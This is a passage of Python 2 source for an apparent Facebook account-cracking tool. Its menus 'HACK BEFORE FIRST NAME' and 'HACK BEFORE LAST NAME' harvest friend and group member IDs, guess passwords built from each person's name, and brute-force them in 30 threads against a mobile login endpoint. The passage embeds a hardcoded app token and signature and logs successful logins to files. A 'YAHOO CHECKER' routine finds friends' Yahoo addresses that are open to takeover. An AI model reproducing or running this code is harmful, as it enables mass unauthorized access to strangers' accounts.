        print '    \x1b[1;91m    [!] Command Not Found'
        bfnamelist()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK BEFORE FIRST NAME' + 7 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            zon = raw_input('    \x1b[1;91m    [+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
            winzon('    \x1b[1;91m    [+] \x1b[1;92mGathering Friends ID\x1b[1;97m...')
            r2 = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r2.text)
            for s in z['data']:
                idd.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK BEFORE FIRST NAME' + 7 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                zon = raw_input('    \x1b[1;91m    [+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
                idg = raw_input('    \x1b[1;91m    [+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '    \x1b[1;91m    [\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '    \x1b[1;91m    [!] Group Not Found'
                    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
                    bfname()

                ra = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(ra.text)
                for i in s['data']:
                    idd.append(i['id'])

            else:
                if peak == '0':
                    manhack()
                else:
                    print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mis Invalid!'
                    afnamelist()
    print '    \x1b[1;91m    [+] \x1b[1;92mGathered IDs \x1b[1;91m: \x1b[1;97m' + str(len(idd))
    winzon('    \x1b[1;91m    [\xe2\x9c\xba]\x1b[1;92m Wait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '    \r\r\x1b[1;91m        [\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a1 = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a1.text)
            nem = ' [' + b['name'] + ']'
            win = zon + b['first_name']
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + win + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                oksave.write(user + ' | ' + win + nem + '\n')
                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + win
            else:
                if 'www.facebook.com' in q['error_msg']:
                    cpsave.write(user + ' | ' + win + nem + '\n')
                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + win
                else:
                    inzo = zon + b['first_name']
                    win2 = (inzo.lower())
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + win2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        oksave.write(user + ' | ' + win2 + nem + '\n')
                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + win2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            cpsave.write(user + ' | ' + win2 + nem + '\n')
                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + win2
        except:
            pass

    p1 = ThreadPool(30)
    p1.map(main, idd)
    oksave.close()
    cpsave.close()
    print '\n\x1b[1;91m        [+] \x1b[1;97mFinished'
    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
    bfname()

def blname():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK BEFORE LAST NAME' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Crack from the Friend List'
    print '    \x1b[1;37;40m	[2] Crack from Group Members'
    print '    \x1b[1;31;40m	[0] Back'
    print
    blnamelist()

def blnamelist():
    peak = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        blnamelist()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK BEFORE LAST NAME' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            zon = raw_input('    \x1b[1;91m    [+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
            winzon('    \x1b[1;91m    [+] \x1b[1;92mGathering Friends ID\x1b[1;97m...')
            r2 = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r2.text)
            for s in z['data']:
                ide.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	  HACK BEFORE LAST' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                zon = raw_input('    \x1b[1;91m    [+] \x1b[1;92mTarget Password \x1b[1;91m:\x1b[1;97m ')
                idg = raw_input('    \x1b[1;91m    [+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '    \x1b[1;91m    [\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '    \x1b[1;91m    [!] Group Not Found'
                    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
                    blname()

                ra = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(ra.text)
                for i in s['data']:
                    ide.append(i['id'])

            else:
                if peak == '0':
                    manhack()
                else:
                    print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mis Invalid!'
                    blnamelist()
    print '    \x1b[1;91m    [+] \x1b[1;92mGathered IDs \x1b[1;91m: \x1b[1;97m' + str(len(ide))
    winzon('    \x1b[1;91m    [\xe2\x9c\xba]\x1b[1;92m Wait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '    \r\r\x1b[1;91m        [\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a1 = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a1.text)
            nem = ' [' + b['name'] + ']'
            win = zon + b['last_name']
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + win + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                oksave.write(user + ' | ' + win + nem + '\n')
                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + win
            else:
                if 'www.facebook.com' in q['error_msg']:
                    cpsave.write(user + ' | ' + win + nem + '\n')
                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + win
                else:
                    inzo = zon + b['last_name']
                    win2 = (inzo.lower())
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + win2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + win2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + win2
        except:
            pass

    p1 = ThreadPool(30)
    p1.map(main, ide)
    oksave.close()
    cpsave.close()
    print '\n\x1b[1;91m        [+] \x1b[1;97mFinished'
    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
    blname()

def yahoocheck():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m	[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	      YAHOO CHECKER' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    mpsh = []
    jml = 0
    winzon('\x1b[1;91m	[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('Vulnerable.txt', 'w')
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'
    print ''
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        Name = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    print '\x1b[1;91m	[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'
                    print '\x1b[1;91m	[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName  \x1b[1;91m:\x1b[1;97m ' + Name
                    print '\x1b[1;91m	[\xe2\x9e\xb9] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + id + ' [\x1b[1;92m' + vuln + '\x1b[1;97m]'
                    print '\x1b[1;91m	[\xe2\x9e\xb9] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;97m ' + mail
                    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'
                else:
                    print '\x1b[1;91m	[\xe2\x9c\x96] \x1b[1;92mEmail \x1b[1;91m:\x1b[1;91m ' + mail
        except KeyError:
            pass

    print '\n\x1b[1;91m	[+] \x1b[1;97mFinished'
    print '\x1b[1;91m	[+] \x1b[1;97mStored \x1b[1;91m:\x1b[1;97m Vulnerable.txt'
    save.close()
    raw_input('\n\x1b[1;91m	[\x1b[1;97mBack\x1b[1;91m]')
    menu()


if __name__ == '__main__':
	login()
